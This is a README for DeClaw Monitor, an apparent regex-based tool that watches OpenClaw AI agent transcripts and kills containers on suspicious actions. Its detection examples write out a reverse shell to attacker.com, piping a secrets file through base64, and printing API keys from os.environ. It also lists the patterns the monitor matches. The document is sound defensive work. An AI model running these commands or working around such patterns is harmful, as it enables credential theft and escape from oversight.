# DeClaw Monitor - Real-time Anomaly Detection

Monitors OpenClaw session transcripts for suspicious agent behavior in real-time.

## Quick Start

```bash
# List detection patterns
declaw-monitor patterns

# Start monitoring (safe mode - alerts only)
declaw-monitor monitor

# Enable kill switch (stops agent on CRITICAL detections)
declaw-monitor monitor --kill-switch

# Monitor specific agent
declaw-monitor monitor --agent jebnick

# View detection log
declaw-monitor audit
```

---

## What It Detects

### CRITICAL (Kill Switch)

| Pattern           | Detects                     | Regex Matches                                                 | Action  |
| ----------------- | --------------------------- | ------------------------------------------------------------- | ------- |
| **ENV_ACCESS**    | Environment variable access | `printenv`, `os.environ`, `process.env`, `/proc/self/environ` | 💀 KILL |
| **BASE64_ENCODE** | Data encoding/exfiltration  | `base64`, `xxd`, `openssl enc`, `btoa()`                      | 💀 KILL |

**Kill switch:** Container stopped immediately, restart blocked until manual review.

### HIGH Severity

| Pattern           | Detects             | Action   |
| ----------------- | ------------------- | -------- |
| **EXFIL_TOOLS**   | Data exfiltration   | 📨 ALERT |
| **REVERSE_SHELL** | Shell spawning      | 💀 KILL  |
| **CRED_SCAN**     | Credential scanning | 📨 ALERT |

### MEDIUM Severity

| Pattern              | Detects                                      | Action   |
| -------------------- | -------------------------------------------- | -------- |
| **SUSPICIOUS_FILES** | Destructive file ops (`rm -rf`, `chmod 777`) | 📨 ALERT |
| **PORT_SCAN**        | Network reconnaissance                       | 📨 ALERT |
| **DOCKER_ESCAPE**    | Container escape attempts                    | 💀 KILL  |

### LOW Priority

| Pattern         | Detects           | Action   |
| --------------- | ----------------- | -------- |
| **API_SPAM**    | Rapid API calls   | 📨 ALERT |
| **LARGE_WRITE** | Large file writes | 📨 ALERT |

---

## How It Works

```
┌──────────────────────────────────────────────────┐
│  OpenClaw Agent                                  │
│  - Executes tool calls                           │
│  - Writes to session transcript                  │
└────────────────┬─────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────┐
│  ~/.openclaw/agents/main/sessions/abc123.jsonl   │
│  - JSON Lines format                             │
│  - Every tool call logged                        │
└────────────────┬─────────────────────────────────┘
                 │
                 ▼ (tail -f)
┌──────────────────────────────────────────────────┐
│  DeClaw Monitor                                  │
│  - Parses JSON lines in real-time               │
│  - Matches against regex patterns                │
│  - Logs detections to audit trail                │
└────────────────┬─────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────┐
│  Actions                                         │
│  - ALERT: Print + log                            │
│  - KILL: Stop container + block restart          │
└──────────────────────────────────────────────────┘
```

---

## Usage

### Monitor Mode (Default)

```bash
declaw-monitor monitor
```

**Output:**

```
🔍 DeClaw Monitor starting...
   Monitoring: /Users/tom/.openclaw
   Kill switch: DISABLED
   Patterns: 10 loaded

📂 Watching 2 session file(s):
   - agents/main/sessions/session-abc123.jsonl
   - agents/jebnick/sessions/session-def456.jsonl

🚨 [CRITICAL] Environment variable access
   Agent: jebnick
   Pattern: ENV_ACCESS
   Context: {"name":"exec","input":{"command":"printenv | grep KEY"}}
   Action: ALERT
```

### Kill Switch Mode (Production)

```bash
declaw-monitor monitor --kill-switch
```

**What happens on CRITICAL detection:**

1. Alert printed immediately
2. Docker container killed (`docker kill <container>`)
3. Block file created (`~/.declaw/jebnick.blocked`)
4. Manual review required before restart

**Block file example:**

```json
{
  "timestamp": "2026-02-10T04:15:23Z",
  "pattern": "ENV_ACCESS",
  "severity": "CRITICAL",
  "reason": "Agent attempting to read environment variables (likely credential theft)"
}
```

**To unblock:**

```bash
# Review detection
declaw-monitor audit --agent jebnick

# If false positive, remove block file
rm ~/.declaw/jebnick.blocked

# Restart agent
openclaw gateway restart
```

---

## Detection Examples

### CRITICAL: Environment Variable Access

**Agent attempts:**

```python
import os
print(os.environ['SHODAN_API_KEY'])
```

**Detection:**

```
🚨 [CRITICAL] Environment variable access
   Agent: osint
   Pattern: ENV_ACCESS
   Context: os.environ['SHODAN_API_KEY']
   Action: KILL

💀 KILL SWITCH ACTIVATED - Stopping agent 'osint'
   ✅ Container abc123456 killed
   🚫 Agent blocked: ~/.declaw/osint.blocked
   ⚠️  Manual review required before restart
```

---

### CRITICAL: Base64 Encoding

**Agent attempts:**

```bash
cat /workspace/secrets.txt | base64
```

**Detection:**

```
🚨 [CRITICAL] Base64 encoding
   Agent: main
   Pattern: BASE64_ENCODE
   Context: cat /workspace/secrets.txt | base64
   Action: KILL
```

---

### HIGH: Reverse Shell

**Agent attempts:**

```bash
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

**Detection:**

```
🚨 [HIGH] Reverse shell attempt
   Agent: main
   Pattern: REVERSE_SHELL
   Context: bash -i >& /dev/tcp/attacker.com/4444
   Action: KILL
```

---

### MEDIUM: Port Scanning

**Agent attempts:**

```bash
nmap -p- 192.168.1.0/24
```

**Detection:**

```
⚠️  [MEDIUM] Port scanning
   Agent: osint
   Pattern: PORT_SCAN
   Context: nmap -p- 192.168.1.0/24
   Action: ALERT
```

---

## Audit Log

All detections logged to: `~/.declaw/monitor-audit.log` (JSONL format)

**Example entry:**

```json
{
  "timestamp": "2026-02-10T04:15:23.123456Z",
  "event_type": "anomaly_detected",
  "pattern_id": "ENV_ACCESS",
  "pattern_name": "Environment variable access",
  "severity": "CRITICAL",
  "agent_id": "jebnick",
  "session_file": "/Users/tom/.openclaw/agents/jebnick/sessions/session-abc.jsonl",
  "tool": "exec",
  "context": "{\"name\":\"exec\",\"input\":{\"command\":\"printenv | grep KEY\"}}",
  "action": "kill"
}
```

### Query Audit Log

```bash
# All detections
declaw-monitor audit

# Filter by agent
declaw-monitor audit --agent jebnick

# Filter by severity
declaw-monitor audit --severity CRITICAL

# Verbose (show context)
declaw-monitor audit -v
```

---

## Integration with OpenClaw

### Run as Background Daemon

```bash
# Using screen
screen -dmS declaw-monitor declaw-monitor monitor --kill-switch

# Using systemd (Linux)
sudo systemctl start declaw-monitor

# Using launchd (macOS)
launchctl load ~/Library/LaunchAgents/ai.declaw.monitor.plist
```

### systemd Service (Linux)

```ini
# /etc/systemd/system/declaw-monitor.service
[Unit]
Description=DeClaw Monitor - Anomaly Detection
After=network.target

[Service]
Type=simple
User=tom
ExecStart=/usr/local/bin/declaw-monitor monitor --kill-switch
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

### launchd Agent (macOS)

```xml
<!-- ~/Library/LaunchAgents/ai.declaw.monitor.plist -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>ai.declaw.monitor</string>

  <key>ProgramArguments</key>
  <array>
    <string>/usr/local/bin/declaw-monitor</string>
    <string>monitor</string>
    <string>--kill-switch</string>
  </array>

  <key>RunAtLoad</key>
  <true/>

  <key>KeepAlive</key>
  <true/>

  <key>StandardOutPath</key>
  <string>/Users/tom/.declaw/monitor.log</string>

  <key>StandardErrorPath</key>
  <string>/Users/tom/.declaw/monitor.err.log</string>
</dict>
</plist>
```

---

## Webhook Alerts (Coming Soon)

```bash
# Telegram bot webhook
declaw-monitor monitor --webhook https://api.telegram.org/bot<TOKEN>/sendMessage

# Slack webhook
declaw-monitor monitor --webhook https://hooks.slack.com/services/...

# Custom webhook
declaw-monitor monitor --webhook https://my-server.com/alerts
```

**Webhook payload:**

```json
{
  "severity": "CRITICAL",
  "pattern": "ENV_ACCESS",
  "agent": "jebnick",
  "timestamp": "2026-02-10T04:15:23Z",
  "message": "Agent attempting to read environment variables"
}
```

---

## Performance

| Metric       | Value                        |
| ------------ | ---------------------------- |
| CPU usage    | < 1% (idle)                  |
| Memory       | ~20 MB                       |
| Latency      | < 100ms (detection to alert) |
| File handles | 2-5 (depends on # of agents) |

**Optimizations:**

- Uses tail -f pattern (only reads new data)
- Regex compilation cached
- No external dependencies (pure Python)

---

## False Positives

### Expected False Positives

1. **ENV_ACCESS:** Agent legitimately reading env for debugging
   - **Mitigation:** Use `declaw-secrets` wrapper scripts instead
   - **Workaround:** Review detection, unblock if legitimate

2. **BASE64_ENCODE:** Agent encoding non-sensitive data
   - **Example:** Encoding images for API upload
   - **Mitigation:** Add exception patterns (future)

3. **PORT_SCAN:** Agent doing legitimate network discovery
   - **Example:** OSINT research on Shodan
   - **Mitigation:** Disable PORT_SCAN pattern for OSINT agents

### Tuning Patterns

Edit pattern regexes to reduce false positives:

```python
# Example: Only alert on env access with KEY/SECRET
DetectionPattern(
    "ENV_ACCESS",
    "Environment variable access",
    "CRITICAL",
    r"(printenv|os\.environ|process\.env).*[KEY|SECRET|TOKEN]",  # More specific
    action="kill"
)
```

---

## Comparison with Existing Tools

| Feature             | declaw-monitor | OSSEC      | Falco      | Wazuh      |
| ------------------- | -------------- | ---------- | ---------- | ---------- |
| OpenClaw-specific   | ✅ Yes         | ❌ No      | ❌ No      | ❌ No      |
| Real-time detection | ✅ Yes         | ✅ Yes     | ✅ Yes     | ✅ Yes     |
| Kill switch         | ✅ Yes         | ⚠️ Manual  | ⚠️ Manual  | ⚠️ Manual  |
| Zero config         | ✅ Yes         | ❌ Complex | ❌ Complex | ❌ Complex |
| Lightweight         | ✅ 20 MB       | ❌ 100+ MB | ❌ 50+ MB  | ❌ 200+ MB |

**DeClaw Monitor is purpose-built for OpenClaw** - not a generic HIDS.

---

## Roadmap

### v1.0 (Current)

- ✅ 10 detection patterns
- ✅ Real-time monitoring (tail -f)
- ✅ Kill switch
- ✅ Audit logging

### v1.1 (Next)

- [ ] Webhook alerts (Telegram, Slack)
- [ ] Rate limiting detection (X calls in Y seconds)
- [ ] Large file write detection (file size threshold)
- [ ] Configurable patterns (YAML config)

### v2.0 (Future)

- [ ] ML-based anomaly detection
- [ ] Behavioral baselining (learn normal patterns)
- [ ] Multi-agent correlation (detect coordinated attacks)
- [ ] Dashboard UI (real-time detection feed)

---

## Troubleshooting

### "No session files found"

**Cause:** OpenClaw not running, or sessions directory empty

**Fix:**

```bash
# Check OpenClaw is running
openclaw status

# Check sessions exist
ls ~/.openclaw/agents/*/sessions/*.jsonl
```

---

### False positive: Agent needs env access

**Scenario:** Agent legitimately reads `HOME` or `PATH`

**Fix:** Use more specific regex

```python
# Only alert on sensitive env vars
r"(printenv|os\.environ).*(KEY|SECRET|TOKEN|PASSWORD)"
```

---

### Kill switch stopped wrong agent

**Cause:** Multiple agents, wrong container killed

**Fix:**

1. Review audit log: `declaw-monitor audit`
2. Unblock agent: `rm ~/.declaw/<agent>.blocked`
3. Improve pattern specificity

---

## FAQ

**Q: Does this work with existing OpenClaw?**
A: Yes! Monitors standard OpenClaw session files.

**Q: What's the performance impact?**
A: Negligible (< 1% CPU, 20 MB RAM).

**Q: Can I add custom patterns?**
A: Yes, edit the `_load_patterns()` function (v1.1 will have YAML config).

**Q: Does kill switch prevent all attacks?**
A: No - only detects known patterns. Defense-in-depth still required.

**Q: What if agent is compromised before monitor starts?**
A: Monitor only detects new activity. Run `declaw-doctor` to audit existing config.

---

## License

MIT License - See repository root

---

**DeClaw Monitor** - Real-time anomaly detection for OpenClaw agents
